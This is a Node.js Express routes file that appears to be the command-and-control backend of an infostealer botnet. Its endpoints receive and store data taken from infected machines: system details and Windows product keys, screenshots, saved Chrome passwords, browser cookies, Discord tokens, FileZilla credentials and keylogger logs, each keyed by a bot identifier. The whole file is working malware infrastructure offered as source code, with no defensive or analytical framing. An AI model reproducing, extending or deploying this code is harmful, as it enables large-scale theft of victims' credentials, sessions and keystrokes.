const fs = require("fs");
const multer = require("multer");
const db = require("../../models");
const ip = require("../../library/ip.js");
const v = require("../../library/verifier.js");

const image_storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, "./server/images");
    },
    filename: (req, file, cb) => {
        cb(null, req.params.identifier + ".jpg");
    },
});

const log_storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, "./server/logs");
    },
    filename: (req, file, cb) => {
        cb(null, req.params.identifier + ".txt");
    },
});

const image_upload = multer({ storage: image_storage });
const log_upload = multer({ storage: log_storage });

module.exports = (application) => {
    application.post("/update/details/:identifier/:token", async (req, res) => {
        const { identifier, token } = req.params;
        const postdata = req.body;
        if (identifier && token && Object.keys(postdata).length > 1) {
            const verify = await v.validate(identifier, token);
            if (verify) {
                const ipAddress = "78.87.194.58";
                let ipInfo = await ip.info(ipAddress);
                ipInfo = ipInfo.data;

                let options = {};

                options.ipAddress = ipAddress;
                options.country = ipInfo.country;
                options.countryCode = ipInfo.countryCode;
                options.region = ipInfo.regionName;
                options.regionCode = ipInfo.region;
                options.city = ipInfo.city;
                options.lat = ipInfo.lat;
                options.lon = ipInfo.lon;
                options.isp = ipInfo.isp;

                if (postdata.operating_system) {
                    options.operatingSystem = postdata.operating_system;
                }

                if (postdata.node_name) {
                    options.nodeName = postdata.node_name;
                }

                if (postdata.release) {
                    options.release = postdata.release;
                }

                if (postdata.version) {
                    options.version = postdata.version;
                }

                if (postdata.processor) {
                    options.processor = postdata.processor;
                }

                if (postdata.architecture) {
                    options.architecture = postdata.architecture;
                }

                if (postdata.boot_time) {
                    options.bootTime = postdata.boot_time;
                }

                if (postdata.memory) {
                    options.memory = postdata.memory;
                }

                if (postdata.windows_key) {
                    options.windowsKey = postdata.windows_key;
                }

                db.Bots.update(options, {
                    where: {
                        identifier: identifier,
                    },
                }).then(() => {
                    res.status(200).json({
                        message: "Update OK",
                    });
                });
            } else {
                res.status(401).json({
                    message: "Bot not found or token/id is invalid",
                });
            }
        } else {
            res.status(403).json({
                message: "Missing token/id or not enough POST fields",
            });
        }
    });

    application.post(
        "/update/screenshot/:identifier/:token",
        image_upload.single("file"),
        async (req, res) => {
            const { identifier, token } = req.params;
            if (identifier && token) {
                const verify = await v.validate(identifier, token);
                if (verify) {
                    db.Screenshots.findAll({
                        where: {
                            identifier: identifier,
                        },
                    }).then((results) => {
                        if (results.length > 0) {
                            db.Screenshots.update(
                                {
                                    identifier: identifier,
                                    link:
                                        "./server/images/" +
                                        identifier +
                                        ".jpg",
                                },
                                {
                                    where: {
                                        identifier: identifier,
                                    },
                                }
                            ).then(() => {
                                res.status(200).json({
                                    message: "Upload OK",
                                });
                            });
                        } else {
                            db.Screenshots.create({
                                identifier: identifier,
                                link: "./server/images/" + identifier + ".jpg",
                            }).then(() => {
                                res.status(200).json({
                                    message: "Upload OK",
                                });
                            });
                        }
                    });
                } else {
                    res.status(401).json({
                        message: "Bot not found or token/id is invalid",
                    });
                }
            } else {
                res.status(403).json({
                    message: "Missing token/id or not enough POST fields",
                });
            }
        }
    );

    application.post("/update/chrome/:identifier/:token", async (req, res) => {
        const { identifier, token } = req.params;
        const postdata = req.body;
        if (identifier && token && Object.keys(postdata).length == 3) {
            const verify = await v.validate(identifier, token);
            if (verify) {
                db.Chrome.findAll({
                    where: {
                        identifier: identifier,
                        host: postdata.host,
                    },
                }).then((results) => {
                    if (results.length > 0) {
                        db.Chrome.update(
                            {
                                host: postdata.host,
                                user: postdata.user,
                                password: postdata.password,
                            },
                            {
                                where: {
                                    identifier: identifier,
                                    host: postdata.host,
                                },
                            }
                        ).then(() => {
                            res.status(200).json({
                                message: "Chrome details updated",
                            });
                        });
                    } else {
                        db.Chrome.create({
                            identifier: identifier,
                            host: postdata.host,
                            user: postdata.user,
                            password: postdata.password,
                        }).then(() => {
                            res.status(200).json({
                                message: "Chrome details created",
                            });
                        });
                    }
                });
            } else {
                res.status(401).json({
                    message: "Bot not found or token/id is invalid",
                });
            }
        } else {
            res.status(403).json({
                message: "Missing token/id or not enough POST fields",
            });
        }
    });

    application.post("/update/cookies/:identifier/:token", async (req, res) => {
        const { identifier, token } = req.params;
        const { cookies } = req.body;
        if (identifier && token && cookies) {
            const verify = await v.validate(identifier, token);
            if (verify) {
                db.Cookies.findAll({
                    where: {
                        identifier: identifier,
                    },
                }).then((results) => {
                    if (results.length > 0) {
                        db.Cookies.update(
                            {
                                identifier: identifier,
                                cookies: cookies,
                            },
                            {
                                where: {
                                    identifier: identifier,
                                },
                            }
                        ).then(() => {
                            res.status(200).json({
                                message: "Cookie details updated",
                            });
                        });
                    } else {
                        db.Cookies.create({
                            identifier: identifier,
                            cookies: cookies,
                        }).then(() => {
                            res.status(200).json({
                                message: "Cookie details updated",
                            });
                        });
                    }
                });
            } else {
                res.status(401).json({
                    message: "Bot not found or token/id is invalid",
                });
            }
        } else {
            res.status(403).json({
                message: "Missing token/id or not enough POST fields",
            });
        }
    });

    application.post("/update/discord/:identifier/:token", async (req, res) => {
        const { identifier, token } = req.params;
        const { tokens } = req.body;
        if (identifier && token && tokens) {
            const verify = await v.validate(identifier, token);
            if (verify) {
                db.Discord.findAll({
                    where: {
                        identifier: identifier,
                    },
                }).then((results) => {
                    if (results.length > 0) {
                        db.Discord.update(
                            {
                                identifier: identifier,
                                tokens: tokens,
                            },
                            {
                                where: {
                                    identifier: identifier,
                                },
                            }
                        ).then(() => {
                            res.status(200).json({
                                message: "Discord details updated",
                            });
                        });
                    } else {
                        db.Discord.create({
                            identifier: identifier,
                            tokens: tokens,
                        }).then(() => {
                            res.status(200).json({
                                message: "Discord details updated",
                            });
                        });
                    }
                });
            } else {
                res.status(401).json({
                    message: "Bot not found or token/id is invalid",
                });
            }
        } else {
            res.status(403).json({
                message: "Missing token/id or not enough POST fields",
            });
        }
    });

    application.post(
        "/update/filezilla/:identifier/:token",
        async (req, res) => {
            const { identifier, token } = req.params;
            const postdata = req.body;
            if (identifier && token && Object.keys(postdata).length == 4) {
                const verify = await v.validate(identifier, token);
                if (verify) {
                    db.Filezilla.findAll({
                        where: {
                            identifier: identifier,
                            host: postdata.host,
                        },
                    }).then((results) => {
                        if (results.length > 0) {
                            db.Filezilla.update(
                                {
                                    host: postdata.host,
                                    port: postdata.post,
                                    user: postdata.user,
                                    password: postdata.password,
                                },
                                {
                                    where: {
                                        identifier: identifier,
                                        host: postdata.host,
                                    },
                                }
                            ).then(() => {
                                res.status(200).json({
                                    message: "Filezzila details updated",
                                });
                            });
                        } else {
                            db.Filezilla.create({
                                identifier: identifier,
                                host: postdata.host,
                                port: postdata.port,
                                user: postdata.user,
                                password: postdata.password,
                            }).then(() => {
                                res.status(200).json({
                                    message: "Filezilla details created",
                                });
                            });
                        }
                    });
                } else {
                    res.status(401).json({
                        message: "Bot not found or token/id is invalid",
                    });
                }
            } else {
                res.status(403).json({
                    message: "Missing token/id or not enough POST fields",
                });
            }
        }
    );

    application.post(
        "/update/keylogger/:identifier/:token",
        log_upload.single("file"),
        async (req, res) => {
            const { identifier, token } = req.params;
            if (identifier && token) {
                const verify = await v.validate(identifier, token);
                if (verify) {
                    db.Bots.findAll({
                        where: {
                            identifier: identifier,
                        },
                    }).then((results) => {
                        if (results.length > 0 && results[0].logSize) {
                            db.Bots.update(
                                {
                                    logSize:
                                        fs.statSync(
                                            "./server/logs/" +
                                                identifier +
                                                ".txt"
                                        ).size /
                                            1000000 +
                                        "MB",
                                },
                                {
                                    where: {
                                        identifier: identifier,
                                    },
                                }
                            ).then(() => {
                                res.status(200).json({
                                    message: "Upload OK",
                                });
                            });
                        } else {
                            res.status(200).json({
                                message: "Upload OK",
                            });
                        }
                    });
                } else {
                    res.status(401).json({
                        message: "Bot not found or token/id is invalid",
                    });
                }
            } else {
                res.status(403).json({
                    message: "Missing token/id or not enough POST fields",
                });
            }
        }
    );
};
